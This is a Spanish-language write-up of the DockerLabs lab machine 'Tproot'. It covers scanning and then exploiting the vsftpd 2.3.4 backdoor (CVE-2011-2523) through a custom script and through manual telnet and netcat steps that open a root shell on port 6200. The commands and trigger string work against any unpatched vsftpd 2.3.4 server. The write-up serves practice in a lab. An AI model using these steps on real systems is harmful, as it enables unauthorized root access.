# Máquina: Tproot — DockerLabs

**Dificultad:** Muy fácil  
**SO:** Unix  
**IP objetivo:** `172.17.0.2`  
**CVE:** [CVE-2011-2523](https://github.com/topics/cve-2011-2523)  
**Técnicas:** Enumeración de versiones · Explotación de backdoor en VSFTPD 2.3.4

> Esta máquina comparte la misma vulnerabilidad que **Firsthacking**. El exploit `CVE-2011-2523.py` fue adaptado específicamente para esta vulnerabilidad.

---

## Flujo del ataque

```
Ping → Nmap (FTP vsftpd 2.3.4 + HTTP) → CVE-2011-2523 → Backdoor puerto 6200 → ROOT
```

---

## 1. Reconocimiento

### Ping

```bash
ping -c 4 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.103 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.091 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.059 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.091 ms
4 packets transmitted, 4 received, 0% packet loss
```

TTL = 64 → Sistema Linux/Unix confirmado.

### Nmap

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn -oN scan 172.17.0.2
```

| Puerto | Estado | Servicio | Versión              |
|--------|--------|----------|----------------------|
| 21/tcp | open   | FTP      | vsftpd 2.3.4         |
| 80/tcp | open   | HTTP     | Apache 2.4.58 Ubuntu |

La versión **vsftpd 2.3.4** tiene una backdoor conocida catalogada como **CVE-2011-2523**. Cualquier usuario que se autentique con `:)` al final del nombre activa una shell como root en el puerto **6200**.

Nmap también reporta `ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp"`, lo que indica que el login anónimo está mal configurado. No es necesario para la explotación.

---

## 2. CVE-2011-2523 — Mecanismo del backdoor

Esta versión de vsftpd fue comprometida en su cadena de distribución oficial en 2011. Cuando el campo `USER` contiene una cadena terminada en `:)`, el servidor abre una command shell como root en el puerto **6200**, accesible sin autenticación adicional.

---

## 3. Explotación — Script propio (recomendado)

```bash
python3 CVE-2011-2523.py -host 172.17.0.2
```

```
[+] Opening connection to 172.17.0.2 on port 21... Done
[+] Backdoor triggered — waiting for port 6200 to open...
[+] Conexion exitosa a 172.17.0.2:6200 — shell abierta
```

```bash
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

Shell root obtenida directamente con el exploit. Sin escalada de privilegios necesaria.

---

## 4. Explotación — Método manual (Telnet + Netcat)

### Paso 1 — Activar el backdoor vía Telnet

```bash
telnet 172.17.0.2 21
```

```
Trying 172.17.0.2...
Connected to 172.17.0.2.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
USER hi:)
331 Please specify the password.
PASS hi
```

El usuario puede ser cualquier cadena, lo importante es que termine en `:)`. La contraseña también puede ser cualquier cosa.

### Paso 2 — Verificar que el puerto 6200 está abierto

En otra terminal, inmediatamente después del login:

```bash
nmap -p 6200 172.17.0.2
```

```
PORT     STATE SERVICE
6200/tcp open  lm-x
```

### Paso 3 — Conectarse a la shell con Netcat

Repetir el paso 1 y en otra terminal ejecutar de inmediato:

```bash
nc 172.17.0.2 6200
```

La shell no muestra prompt, pero está activa:

```bash
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

---

## Resumen

| Campo        | Valor                         |
|--------------|-------------------------------|
| Servicio     | FTP — vsftpd 2.3.4            |
| CVE          | CVE-2011-2523                 |
| Vector       | Backdoor en campo USER (`:)`) |
| Puerto shell | 6200/tcp                      |
| Acceso       | root directo, sin escalada    |
| Herramientas | CVE-2011-2523.py · telnet · nmap · netcat |

---

## Referencias

- [CVE-2011-2523 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [GitHub — CVE-2011-2523 exploits](https://github.com/topics/cve-2011-2523)
- [VSFTPD Backdoor análisis técnico](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)
- [CVE-2011-2523.py](https://github.com/fareszuleta/Dockerlabs/tree/main/Tproot)
